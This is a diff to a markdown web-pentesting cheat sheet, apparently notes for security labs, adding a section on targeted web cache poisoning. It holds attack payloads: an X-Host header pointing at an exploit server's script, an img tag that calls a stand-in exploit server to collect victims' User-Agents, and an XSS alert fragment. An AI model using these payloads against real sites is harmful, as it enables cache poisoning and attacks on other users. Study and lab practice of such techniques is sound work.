@@ -216,4 +216,20 @@ Always go for directory brute force and for .files(hidden files) e.g. <b>.git</b
 `fehost="-alert(document.cookies)-"`
 
 ### Basic Web cache 
-X-Forwarded-Host header has been used by the application to generate an Open Graph URL inside a meta tag.
+`X-Forwarded-Host` header has been used by the application to generate an Open Graph URL inside a meta tag.
+
+
+### Targeted web cache poisoning using an unknown header
+`Vary: User-Agent` -> "For example, if the attacker knows that the User-Agent header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected."
+
+`X-Host: exploitserver.net/resources/js/tracking.js`
+
+Steal other users `User-Agents`:
+If you have post functionality you can use this payload:
+```html
+<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
+```
+
+and final step is to poison the victims user-agents stoled from img tag
+
+
